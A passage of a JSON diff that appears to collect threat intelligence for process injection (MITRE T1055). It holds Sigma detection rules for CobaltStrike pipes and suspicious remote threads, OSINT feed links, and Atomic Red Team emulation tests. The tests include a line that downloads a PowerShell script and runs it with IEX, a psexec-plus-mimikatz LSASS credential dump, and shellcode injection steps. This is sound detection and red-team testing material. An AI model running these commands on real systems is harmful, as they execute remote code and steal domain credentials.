attack.t1055.002\n- attack.t1055\ntitle: Suspicious In-Memory Module Execution\n",
+                            "sigma:id": "5f113a8f-8b61-41ca-b90f-d374fa7e4a39",
+                            "title": "Suspicious In-Memory Module Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "54dd4ef7-f7b2-418e-a191-5def4fbb0033",
+                        "lookup_data": {
+                            "description": "Turla: A Galaxy of Opportunity",
+                            "link": "http://www.botvrij.eu/data/feed-osint/54dd4ef7-f7b2-418e-a191-5def4fbb0033.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1673286950",
+                            "uuid": "54dd4ef7-f7b2-418e-a191-5def4fbb0033",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "66d31e5f-52d6-40a4-9615-002d3789a119",
+                        "lookup_data": {
+                            "description": "Offensive tradecraft is switching away from using APIs like \"CreateRemoteThread\", however, this is still largely observed in the wild.\nThis rule aims to detect suspicious processes (those we would not expect to behave in this way like word.exe or outlook.exe) creating remote threads on other processes.\nIt is a generalistic rule, but it should have a low FP ratio due to the selected range of processes.\n",
+                            "raw": "author: Perez Diego (@darkquassar), oscd.community\ndate: 2019/10/27\ndescription: 'Offensive tradecraft is switching away from using APIs like \"CreateRemoteThread\",\n  however, this is still largely observed in the wild.\n\n  This rule aims to detect suspicious processes (those we would not expect to behave\n  in this way like word.exe or outlook.exe) creating remote threads on other processes.\n\n  It is a generalistic rule, but it should have a low FP ratio due to the selected\n  range of processes.\n\n  '\ndetection:\n  condition: selection and not 1 of filter*\n  filter2:\n    SourceImage: C:\\Windows\\System32\\winlogon.exe\n    TargetImage:\n    - C:\\Windows\\System32\\services.exe\n    - C:\\Windows\\System32\\wininit.exe\n    - C:\\Windows\\System32\\csrss.exe\n  filter3:\n    SourceImage: C:\\Windows\\System32\\provtool.exe\n    TargetParentProcessId: 0\n  filter4:\n    SourceImage|endswith: \\git.exe\n    TargetImage|endswith:\n    - \\git.exe\n    - C:\\Windows\\System32\\conhost.exe\n  filter5:\n    SourceImage: C:\\Windows\\System32\\VSSVC.exe\n    TargetImage: System\n  filter_nvidia:\n    SourceImage: C:\\Windows\\explorer.exe\n    TargetImage: C:\\Program Files\\NVIDIA Corporation\\NVIDIA GeForce Experience\\NVIDIA\n      GeForce Experience.exe\n  filter_powershell:\n    SourceParentImage: C:\\Windows\\System32\\CompatTelRunner.exe\n  filter_schtasks_conhost:\n    SourceImage:\n    - C:\\Windows\\System32\\schtasks.exe\n    - C:\\Windows\\SysWOW64\\schtasks.exe\n    TargetImage: C:\\Windows\\System32\\conhost.exe\n  filter_vs:\n  - SourceImage|contains: Visual Studio\n  - SourceParentImage|contains: \\Programs\\Microsoft VS Code\\\n  selection:\n    SourceImage|endswith:\n    - \\bash.exe\n    - \\cvtres.exe\n    - \\defrag.exe\n    - \\dnx.exe\n    - \\esentutl.exe\n    - \\excel.exe\n    - \\expand.exe\n    - \\explorer.exe\n    - \\find.exe\n    - \\findstr.exe\n    - \\forfiles.exe\n    - \\gpupdate.exe\n    - \\hh.exe\n    - \\iexplore.exe\n    - \\installutil.exe\n    - \\lync.exe\n    - \\makecab.exe\n    - \\mDNSResponder.exe\n    - \\monitoringhost.exe\n    - \\msbuild.exe\n    - \\mshta.exe\n    - \\msiexec.exe\n    - \\mspaint.exe\n    - \\outlook.exe\n    - \\ping.exe\n    - \\powerpnt.exe\n    - \\provtool.exe\n    - \\python.exe\n    - \\regsvr32.exe\n    - \\robocopy.exe\n    - \\runonce.exe\n    - \\sapcimc.exe\n    - \\schtasks.exe\n    - \\smartscreen.exe\n    - \\spoolsv.exe\n    - \\tstheme.exe\n    - \\userinit.exe\n    - \\vssadmin.exe\n    - \\vssvc.exe\n    - \\w3wp.exe\n    - \\winlogon.exe\n    - \\winscp.exe\n    - \\wmic.exe\n    - \\word.exe\n    - \\wscript.exe\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- SourceImage\n- TargetImage\nid: 66d31e5f-52d6-40a4-9615-002d3789a119\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nmodified: 2022/12/14\nnotes:\n- MonitoringHost.exe is a process that loads .NET CLR by default and thus a favorite\n  for process injection for .NET in-memory offensive tools.\nreferences:\n- Personal research, statistical analysis\n- https://lolbas-project.github.io\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1055\ntitle: Suspicious Remote Thread Source\n",
+                            "sigma:id": "66d31e5f-52d6-40a4-9615-002d3789a119",
+                            "title": "Suspicious Remote Thread Source",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "d5601f8c-b26f-4ab0-9035-69e11a8d4ad2",
+                        "lookup_data": {
+                            "description": "Detects the creation of a named pipe as used by CobaltStrike",
+                            "raw": "author: Florian Roth (Nextron Systems), Wojciech Lesicki\ndate: 2021/05/25\ndescription: Detects the creation of a named pipe as used by CobaltStrike\ndetection:\n  condition: 1 of selection*\n  selection_MSSE:\n    PipeName|contains|all:\n    - \\MSSE-\n    - -server\n  selection_interprocess:\n    PipeName|startswith: \\interprocess_\n  selection_lsarpc:\n    PipeName|startswith: \\lsarpc_\n  selection_mojo:\n    PipeName|startswith: \\mojo_\n  selection_msagent:\n    PipeName|startswith: \\msagent_\n  selection_netlogon:\n    PipeName|startswith: \\netlogon_\n  selection_postex:\n    PipeName|startswith: \\postex_\n  selection_samr:\n    PipeName|startswith: \\samr_\n  selection_srvsvc:\n    PipeName|startswith: \\srvsvc_\n  selection_status:\n    PipeName|startswith: \\status_\n  selection_wkssvc:\n    PipeName|startswith: \\wkssvc_\nfalsepositives:\n- Unknown\nid: d5601f8c-b26f-4ab0-9035-69e11a8d4ad2\nlevel: critical\nlogsource:\n  category: pipe_created\n  definition: Note that you have to configure logging for Named Pipe Events in Sysmon\n    config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon\n    configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth\n    verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config,\n    https://github.com/olafhartong/sysmon-modular. How to test detection? You can\n    always use Cobalt Strike, but also you can check powershell script from this site\n    https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\n  product: windows\nmodified: 2022/10/31\nreferences:\n- https://twitter.com/d4rksystem/status/1357010969264873472\n- https://labs.f-secure.com/blog/detecting-cobalt-strike-default-modules-via-named-pipe-analysis/\n- https://github.com/SigmaHQ/sigma/issues/253\n- https://blog.cobaltstrike.com/2021/02/09/learn-pipe-fitting-for-all-of-your-offense-projects/\n- https://redcanary.com/threat-detection-report/threats/cobalt-strike/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055\ntitle: CobaltStrike Named Pipe\n",
+                            "sigma:id": "d5601f8c-b26f-4ab0-9035-69e11a8d4ad2",
+                            "title": "CobaltStrike Named Pipe",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "409f8a98-4496-4aaa-818a-c931c0a8b832",
+                        "lookup_data": {
+                            "description": "This rule detects suspicious files created by Microsoft Sync Center (mobsync)",
+                            "raw": "author: elhoim\ndate: 2022/04/28\ndescription: This rule detects suspicious files created by Microsoft Sync Center (mobsync)\ndetection:\n  condition: selection_mobsync and filter_created_file\n  filter_created_file:\n    TargetFilename|endswith:\n    - .dll\n    - .exe\n  selection_mobsync:\n    Image|endswith: \\mobsync.exe\nfalsepositives:\n- Unknown\nid: 409f8a98-4496-4aaa-818a-c931c0a8b832\nlevel: medium\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/06/02\nreferences:\n- https://redcanary.com/blog/intelligence-insights-november-2021/\nstatus: experimental\ntags:\n- attack.t1055\n- attack.t1218\n- attack.execution\n- attack.defense_evasion\ntitle: Created Files by Microsoft Sync Center\n",
+                            "sigma:id": "409f8a98-4496-4aaa-818a-c931c0a8b832",
+                            "title": "Created Files by Microsoft Sync Center",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "d1aa3382-abab-446f-96ea-4de52908210b",
+                        "lookup_data": {
+                            "description": "Detects specific process characteristics of Chinese TAIDOOR RAT malware load",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/07/30\ndescription: Detects specific process characteristics of Chinese TAIDOOR RAT malware\n  load\ndetection:\n  condition: selection1 or ( selection2a and selection2b )\n  selection1:\n    CommandLine|contains:\n    - dll,MyStart\n    - dll MyStart\n  selection2a:\n    CommandLine|endswith: ' MyStart'\n  selection2b:\n    CommandLine|contains: rundll32.exe\nfalsepositives:\n- Unknown\nid: d1aa3382-abab-446f-96ea-4de52908210b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://us-cert.cisa.gov/ncas/analysis-reports/ar20-216a\nstatus: test\ntags:\n- attack.execution\n- attack.t1055.001\ntitle: TAIDOOR RAT DLL Load\n",
+                            "sigma:id": "d1aa3382-abab-446f-96ea-4de52908210b",
+                            "title": "TAIDOOR RAT DLL Load",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "758d96ed-9dd4-4009-9270-65f2c3dd30cc",
+                        "lookup_data": {
+                            "description": "Buzzing in the Background: BumbleBee, a New Modular Backdoor Evolved From BookWorm",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/758d96ed-9dd4-4009-9270-65f2c3dd30cc.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1666603410",
+                            "uuid": "758d96ed-9dd4-4009-9270-65f2c3dd30cc",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5ced8da1-0960-40bc-b5dc-2fed0a016219",
+                        "lookup_data": {
+                            "description": "Turla PowerShell blogpost",
+                            "link": "http://www.botvrij.eu/data/feed-osint/5ced8da1-0960-40bc-b5dc-2fed0a016219.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1559232101",
+                            "uuid": "5ced8da1-0960-40bc-b5dc-2fed0a016219",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5dee2bc3-47ac-4784-a52a-4da2950d210f",
+                        "lookup_data": {
+                            "description": "OSINT - BfV Cyber-Brief Nr. 01/2019 - Hinweis auf aktuelle Angriffskampagne -",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5dee2bc3-47ac-4784-a52a-4da2950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1576068623",
+                            "uuid": "5dee2bc3-47ac-4784-a52a-4da2950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0e7163d4-9e19-4fa7-9be6-000c61aad77a",
+                        "lookup_data": {
+                            "description": "Detects the creation of a named pipe matching a pattern used by CobaltStrike Malleable C2 profiles",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/07/30\ndescription: Detects the creation of a named pipe matching a pattern used by CobaltStrike\n  Malleable C2 profiles\ndetection:\n  condition: selection\n  selection:\n  - PipeName|re: \\\\mojo\\.5688\\.8052\\.(?:183894939787088877|35780273329370473)[0-9a-f]{2}\n  - PipeName|re: \\\\wkssvc_?[0-9a-f]{2}\n  - PipeName|re: \\\\ntsvcs[0-9a-f]{2}\n  - PipeName|re: \\\\DserNamePipe[0-9a-f]{2}\n  - PipeName|re: \\\\SearchTextHarvester[0-9a-f]{2}\n  - PipeName|re: \\\\mypipe-(?:f|h)[0-9a-f]{2}\n  - PipeName|re: \\\\windows\\.update\\.manager[0-9a-f]{2,3}\n  - PipeName|re: \\\\ntsvcs_[0-9a-f]{2}\n  - PipeName|re: \\\\scerpc_?[0-9a-f]{2}\n  - PipeName|re: \\\\PGMessagePipe[0-9a-f]{2}\n  - PipeName|re: \\\\MsFteWds[0-9a-f]{2}\n  - PipeName|re: \\\\f4c3[0-9a-f]{2}\n  - PipeName|re: \\\\fullduplex_[0-9a-f]{2}\n  - PipeName|re: \\\\msrpc_[0-9a-f]{4}\n  - PipeName|re: \\\\win\\\\msrpc_[0-9a-f]{2}\n  - PipeName|re: \\\\f53f[0-9a-f]{2}\n  - PipeName|re: \\\\rpc_[0-9a-f]{2}\n  - PipeName|re: \\\\spoolss_[0-9a-f]{2}\n  - PipeName|re: \\\\Winsock2\\\\CatalogChangeListener-[0-9a-f]{3}-0,\nfalsepositives:\n- Unknown\nid: 0e7163d4-9e19-4fa7-9be6-000c61aad77a\nlevel: critical\nlogsource:\n  category: pipe_created\n  definition: Note that you have to configure logging for Named Pipe Events in Sysmon\n    config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon\n    configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth\n    verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config,\n    https://github.com/olafhartong/sysmon-modular You can also use other repo, e.g.\n    https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular.\n    How to test detection? You can always use Cobalt Strike, but also you can check\n    powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\n  product: windows\nmodified: 2022/12/31\nreferences:\n- https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\n- https://gist.github.com/MHaggis/6c600e524045a6d49c35291a21e10752\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055\ntitle: CobaltStrike Named Pipe Pattern Regex\n",
+                            "sigma:id": "0e7163d4-9e19-4fa7-9be6-000c61aad77a",
+                            "title": "CobaltStrike Named Pipe Pattern Regex",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "d78b5d61-187d-44b6-bf02-93486a80de5a",
+                        "lookup_data": {
+                            "description": "Detects the use of the Dinject PowerShell cradle based on the specific flags",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/12/07\ndescription: Detects the use of the Dinject PowerShell cradle based on the specific\n  flags\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_fps:\n  - CommandLine|contains: ' /PASSWORDCHG'\n  - ParentImage:\n    - C:\\Program Files\\CEETIS\\CEETIS_IDE.exe\n    - C:\\Program Files (x86)\\CEETIS\\CEETIS_IDE.exe\n  selection:\n    CommandLine|contains:\n    - ' /am51'\n    - ' /password'\nfalsepositives:\n- Unlikely\nid: d78b5d61-187d-44b6-bf02-93486a80de5a\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/03/07\nreferences:\n- https://github.com/snovvcrash/DInjector\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1055\ntitle: DInject PowerShell Cradle CommandLine Flags\n",
+                            "sigma:id": "d78b5d61-187d-44b6-bf02-93486a80de5a",
+                            "title": "DInject PowerShell Cradle CommandLine Flags",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1055",
+                "display_name": "Process Injection",
+                "atomic_tests": [
+                    {
+                        "name": "Shellcode execution via VBA",
+                        "auto_generated_guid": "1c91e740-1729-4329-b779-feba6e71d048",
+                        "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "txt_path": {
+                                "description": "Path to file containing VBA macro to run",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1055\\src\\x64\\T1055-macrocode.txt"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "The 64-bit version of Microsoft Office must be installed\n",
+                                "prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n",
+                                "get_prereq_command": "Write-Host \"You will need to install Microsoft Word (64-bit) manually to meet this requirement\"\n"
+                            },
+                            {
+                                "description": "\"#{txt_path}\" must exist on disk at specified location\n",
+                                "prereq_command": "if (Test-Path \"#{txt_path}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{txt_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt\" -OutFile \"#{txt_path}\" -UseBasicParsing\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"#{txt_path}\" -officeProduct \"Word\" -sub \"Execute\"\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Remote Process Injection in LSASS via mimikatz",
+                        "auto_generated_guid": "3203ad24-168e-4bec-be36-f79b13ef8a83",
+                        "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "machine": {
+                                "description": "machine to target (via psexec)",
+                                "type": "string",
+                                "default": "DC1"
+                            },
+                            "mimikatz_path": {
+                                "description": "Mimikatz windows executable",
+                                "type": "path",
+                                "default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+                            },
+                            "psexec_path": {
+                                "description": "Path to PsExec",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+                                "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
+                            },
+                            {
+                                "description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n",
+                                "prereq_command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}\n",
+                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" -UseBasicParsing\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_path}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_path}\" -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{psexec_path}\" /accepteula \\\\#{machine} -c #{mimikatz_path} \"lsadump::lsa /inject /id:500\" \"exit\"\n",
+                            "name": "command_prompt",
+                            "elevation_required": false
+                        }
+                    },
+                    {
+                        "name": "Section View Injection",
+                        "auto_generated_guid": "c6952f41-6cf0-450a-b352-2ca8dae7c178",
+                        "description": "This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\"\n",
+                            "cleanup_command": "Stop-Process $notepad.pid",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Dirty Vanity process Injection",
+                        "auto_generated_guid": "49543237-25db-497b-90df-d0a0a6e8fe2c",
+                        "description": "This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process\nwith shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at \nBlackHat Europe 2022. Shellcode will open a messsage box and a notepad.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "pid": {
+                                "description": "Parent process ID",
+                                "type": "string",
+                                "default": "(Start-Process calc.exe -PassThru).Id"
+                            }
+                        },
+                        "executor": {
+                            "command": "Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" #{pid}\n",
+                            "cleanup_command": "Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force",
+                            "name": "powershell",
+                            "elevation_required": false
+                        }
+                    },
+                    {
+                        "name": "Read-Write-Execute process Injection",
+                        "auto_generated_guid": "0128e48e-8c1a-433a-a11a-a5387384f1e1",
+                        "description": "This test exploited the vulnerability in legitimate PE formats where sections have RWX permission and enough space for shellcode.\nThe RWX injection avoided the use of VirtualAlloc, WriteVirtualMemory, and ProtectVirtualMemory, thus evading detection mechanisms \nthat relied on API call sequences and heuristics. The RWX injection utilises API call sequences: LoadLibrary --> GetModuleInformation --> GetModuleHandleA --> RtlCopyMemory --> CreateThread.\nThe injected shellcode will open a message box and a notepad.\nRWX Process Injection, also known as MockingJay, was introduced to the security community by SecurityJoes.\nMore details can be found at https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution.\nThe original injector and idea were developed for game cheats, as visible at https://github.com/M-r-J-o-h-n/SWH-Injector.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "vuln_dll": {
+                                "description": "vulnerable DLL",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\msys-2.0.dll"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Utility to inject must exist on disk at specified location (#{vuln_dll})\n",
+                                "prereq_command": "if (Test-Path \"#{vuln_dll}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{vuln_dll}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/bin/x64/vuln_dll/msys-2.0.dll\" -OutFile \"#{vuln_dll}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "$address = (& \"$PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value\n& \"PathToAtomicsFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"#{vuln_dll}\" $address\n",
+                            "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Process Injection with Go using UuidFromStringA WinAPI",
+                        "auto_generated_guid": "2315ce15-38b6-46ac-a3eb-5e21abef2545",
+                        "description": "Uses WinAPI UuidFromStringA to load shellcode to a memory address then executes the shellcode using EnumSystemLocalesA.\nWith this technique, memory is allocated on the heap and does not use commonly suspicious APIs such as VirtualAlloc, WriteProcessMemory, or CreateThread \n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#uuidfromstringa)\n- References: \n  - https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/\n  - https://twitter.com/_CPResearch_/status/1352310521752662018\n  - https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\UuidFromStringA.exe -debug\n",
+                            "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n"
+                        }
+                    },
+                    {
+                        "name": "Process Injection with Go using EtwpCreateEtwThread WinAPI",
+                        "auto_generated_guid": "7362ecef-6461-402e-8716-7410e1566400",
+                        "description": "Uses EtwpCreateEtwThread function from ntdll.dll to execute shellcode within the application's process.\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\nSteps taken with this technique\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call EtwpCreateEtwThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#EtwpCreateEtwThread)\n- References: \n  - https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3\n  - https://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/index.htm\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe -debug\n",
+                            "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n"
+                        }
+                    },
+                    {
+                        "name": "Remote Process Injection with Go using RtlCreateUserThread WinAPI",
+                        "auto_generated_guid": "a0c1725f-abcd-40d6-baac-020f3cf94ecd",
+                        "description": "Executes shellcode in a remote process.\n\nSteps taken with this technique\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with RtlCreateUserThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#rtlcreateuserthread)\n- References: \n  - https://www.cobaltstrike.com/blog/cobalt-strikes-process-injection-the-details-cobalt-strike\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "spawn_process_path": {
+                                "description": "Path of the binary to spawn",
+                                "type": "string",
+                                "default": "C:\\Windows\\System32\\werfault.exe"
+                            },
+                            "spawn_process_name": {
+                                "description": "Name of the process spawned",
+                                "type": "string",
+                                "default": "werfault"
+                            }
+                        },
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\RtlCreateUserThread.exe -pid $process.Id -debug\n",
+                            "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue\n"
+                        }
+                    },
+                    {
+                        "name": "Remote Process Injection with Go using CreateRemoteThread WinAPI",
+                        "auto_generated_guid": "69534efc-d5f5-4550-89e6-12c6457b9edd",
+                        "description": "Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellocde in a remote process.\n\nThis application leverages functions from the golang.org/x/sys/windows package, where feasible, like the windows.OpenProcess().\n\nSteps taken with this technique\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethread)\n - References:\n  - https://www.ired.team/offensive-security/code-injection-process-injection/process-injection\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "spawn_process_path": {
+                                "description": "Path of the binary to spawn",
+                                "type": "string",
+                                "default": "C:\\Windows\\System32\\werfault.exe"
+                            },
+                            "spawn_process_name": {
+                                "description": "Name of the process spawned",
+                                "type": "string",
+                                "default": "werfault"
+                            }
+                        },
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThread.exe -pid $process.Id -debug\n",
+                            "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue\n"
+                        }
+                    },
+                    {
